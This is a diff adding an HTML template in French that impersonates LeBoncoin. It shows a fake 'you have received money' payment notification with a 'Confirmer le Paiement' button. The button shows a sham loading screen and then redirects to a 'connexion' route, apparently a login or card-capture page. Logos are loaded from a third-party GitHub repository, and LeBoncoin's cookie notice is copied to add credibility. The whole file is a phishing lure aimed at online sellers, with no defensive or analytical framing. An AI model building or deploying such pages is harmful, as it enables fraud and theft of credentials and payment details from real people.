@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notification de Paiement</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            position: relative;
+            overflow-y: auto;
+        }
+        .platform {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            margin-top: 70px;
+            margin-bottom: 150px;
+        }
+        h1 {
+            color: green;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .header-logo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 70px;
+            object-fit: cover;
+            z-index: 0;
+            filter: contrast(1.2);
+        }
+        .footer-logo {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: auto;
+            z-index: 0;
+            opacity: 0.8;
+        }
+        .validation-container {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 30px auto;
+        }
+        .validation-square {
+            width: 160px;
+            height: 160px;
+            background: linear-gradient(45deg, #ff8c00, #ff4500);
+            border-radius: 25px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-sizing: border-box;
+            animation: square-pop 0.8s ease-in-out forwards, gradient-shift 3s infinite alternate;
+            box-shadow: 0 8px 20px rgba(255, 69, 0, 0.4);
+        }
+        .checkmark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            width: 80px;
+            height: 80px;
+            animation: checkmark-appear 0.5s ease-in-out 0.8s forwards, bounce 0.5s ease-in-out 1.3s;
+        }
+        .checkmark path {
+            stroke: white;
+            stroke-width: 6;
+            stroke-dasharray: 100;
+            stroke-dashoffset: 100;
+            animation: draw-checkmark 0.5s ease-in-out 0.8s forwards;
+        }
+        @keyframes square-pop {
+            0% {
+                transform: scale(0) rotate(0deg);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.2) rotate(10deg);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+        @keyframes gradient-shift {
+            0% {
+                background: linear-gradient(45deg, #ff8c00, #ff4500);
+            }
+            100% {
+                background: linear-gradient(45deg, #ff4500, #ff8c00);
+            }
+        }
+        @keyframes checkmark-appear {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+        @keyframes draw-checkmark {
+            0% {
+                stroke-dashoffset: 100;
+            }
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+        @keyframes bounce {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+            }
+        }
+        .button {
+            background-color: green;
+            color: white;
+            padding: 18px 36px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 18px;
+            margin: 30px 0;
+            cursor: pointer;
+            border: none;
+            border-radius: 10px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 10px rgba(0, 128, 0, 0.3);
+        }
+        .button:hover {
+            background-color: darkgreen;
+            transform: translateY(-2px);
+        }
+
+        /* Styles pour l'écran de chargement */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            font-size: 24px;
+            color: green;
+            display: none; /* Masqué par défaut */
+        }
+
+        /* Styles pour le popup des cookies */
+        .cookie-popup {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            width: 90%;
+            z-index: 1000;
+            display: none; /* Masqué par défaut */
+        }
+        .cookie-popup p {
+            margin: 0 0 15px;
+            font-size: 14px;
+            color: #333;
+        }
+        .cookie-popup button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .cookie-popup button:hover {
+            background-color: darkgreen;
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
+    <a href="https://www.leboncoin.fr" target="_blank">
+        <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png" alt="Logo LeBoncoin" class="header-logo">
+    </a>
+
+    <!-- Plateforme de paiement -->
+    <div class="platform">
+        <h1>Vous avez reçu de l'argent.</h1>
+        <p>Ce paiement LeBoncoin a été déduit du compte de l’acheteur<br>et a été « APPROUVÉ » par sa banque.</p>
+        
+        <!-- Animation de validation carrée avec coche modernisée -->
+        <div class="validation-container">
+            <div class="validation-square"></div>
+            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                <path fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+            </svg>
+        </div>
+
+        <p>Pour recevoir le paiement sur votre compte, cliquez ici :</p>
+        <!-- Bouton avec gestion de la soumission -->
+        <button class="button" onclick="showLoadingScreen()">Confirmer le Paiement</button>
+        <p>Cordialement,<br>LeBoncoin.</p>
+    </div>
+
+    <!-- Logo en bas, étendu sur toute la largeur -->
+    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png?raw=true" alt="Logo LeBoncoin Bas" class="footer-logo">
+
+    <!-- Écran de chargement -->
+    <div id="loadingScreen" class="loading-screen">
+        Connexion en cours...
+    </div>
+
+    <!-- Popup de gestion des cookies -->
+    <div id="cookiePopup" class="cookie-popup">
+        <p>
+            Pour leboncoin, votre expérience sur notre site est une priorité. C'est pourquoi nous utilisons des cookies et autres traceurs pour vous fournir notre service, le personnaliser, en mesurer l’audience et améliorer votre expérience.
+            <br><br>
+            Sur la base de votre consentement, des informations liées à votre navigation sur notre site (telle que l’IP, les pages visitées etc.) sont stockées et/ou lues sur votre terminal par leboncoin et ses 199 partenaires.
+            <br><br>
+            Ces derniers peuvent également associer ces informations à vos données personnelles sur la base de votre consentement ou de leur intérêt légitime, afin de diffuser des publicités personnalisées/ciblées sur différentes plateformes, dont l'écran de télévision, mesurer leurs performances, obtenir des données d'audience et améliorer les produits.
+            <br><br>
+            Vous pouvez vous y opposer en cliquant sur le bouton « Personnaliser ».
+            <br><br>
+            En cliquant sur “Accepter”, ou refuser en cliquant sur "Continuer sans accepter". Vous pouvez changer d'avis à tout moment en cliquant sur Vie privée & cookies figurant en bas de chaque page.
+        </p>
+        <button onclick="acceptCookies()">Accepter & Fermer</button>
+        <button onclick="declineCookies()">Continuer sans accepter</button>
+    </div>
+
+    <script>
+        // Fonction pour afficher l'écran de chargement
+        function showLoadingScreen() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = "{{ url_for('connexion') }}";
+            }, 1000); // Redirection après 1 secondes
+        }
+
+        // Fonction pour afficher le popup des cookies
+        function showCookiePopup() {
+            if (!localStorage.getItem('cookiesAccepted')) {
+                document.getElementById('cookiePopup').style.display = 'block';
+            }
+        }
+
+        // Fonction pour accepter les cookies
+        function acceptCookies() {
+            localStorage.setItem('cookiesAccepted', 'true');
+            document.getElementById('cookiePopup').style.display = 'none';
+        }
+
+        // Fonction pour refuser les cookies
+        function declineCookies() {
+            localStorage.setItem('cookiesAccepted', 'false');
+            document.getElementById('cookiePopup').style.display = 'none';
+        }
+
+        // Afficher le popup des cookies au chargement de la page
+        window.onload = showCookiePopup;
+    </script>
+</body>
+</html>
